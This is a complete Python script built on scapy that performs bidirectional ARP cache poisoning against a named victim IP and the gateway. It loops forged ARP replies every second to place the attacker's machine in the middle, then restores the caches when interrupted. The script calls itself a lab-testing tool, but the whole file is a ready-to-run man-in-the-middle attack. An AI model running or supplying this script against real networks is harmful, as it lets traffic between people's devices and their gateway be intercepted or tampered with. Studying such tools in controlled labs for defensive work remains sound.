import argparse
import time
from datetime import datetime

from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp


def now_hms() -> str:
    return datetime.now().strftime("%H:%M:%S")


def poison_once(iface: str, target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str) -> None:
    to_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    sendp(to_target, iface=iface, verbose=False)
    sendp(to_gateway, iface=iface, verbose=False)


def restore_once(
    iface: str,
    target_ip: str,
    target_mac: str,
    gateway_ip: str,
    gateway_mac: str,
) -> None:
    restore_target = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac,
    )
    restore_gateway = Ether(dst=gateway_mac) / ARP(
        op=2,
        pdst=gateway_ip,
        hwdst=gateway_mac,
        psrc=target_ip,
        hwsrc=target_mac,
    )
    sendp(restore_target, iface=iface, verbose=False)
    sendp(restore_gateway, iface=iface, verbose=False)


def main() -> None:
    parser = argparse.ArgumentParser(description="Bidirectional ARP spoof for lab testing")
    parser.add_argument("--iface", required=True, help="Interface name as shown in Windows")
    parser.add_argument("--target", required=True, help="Victim IP address")
    parser.add_argument("--gateway", required=True, help="Gateway IP address")
    args = parser.parse_args()

    target_ip = args.target
    gateway_ip = args.gateway
    iface = args.iface

    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if not target_mac:
        print(f"Error: failed to resolve target MAC for {target_ip}")
        raise SystemExit(1)

    if not gateway_mac:
        print(f"Error: failed to resolve gateway MAC for {gateway_ip}")
        raise SystemExit(1)

    attacker_mac = get_if_hwaddr(iface)

    print(f"Starting ARP spoof on interface: {iface}")
    print(f"Target: {target_ip} ({target_mac})")
    print(f"Gateway: {gateway_ip} ({gateway_mac})")
    print(f"Attacker MAC: {attacker_mac}")

    try:
        while True:
            poison_once(iface, target_ip, target_mac, gateway_ip, gateway_mac)
            print(
                f"[{now_hms()}] Poisoning {target_ip} - "
                f"telling them {gateway_ip} is at {attacker_mac}"
            )
            time.sleep(1)

    except KeyboardInterrupt:
        print("Stopping. Restoring ARP caches...")
        for _ in range(5):
            restore_once(iface, target_ip, target_mac, gateway_ip, gateway_mac)
            time.sleep(0.2)
        print("Stopped. ARP caches restored.")


if __name__ == "__main__":
    main()
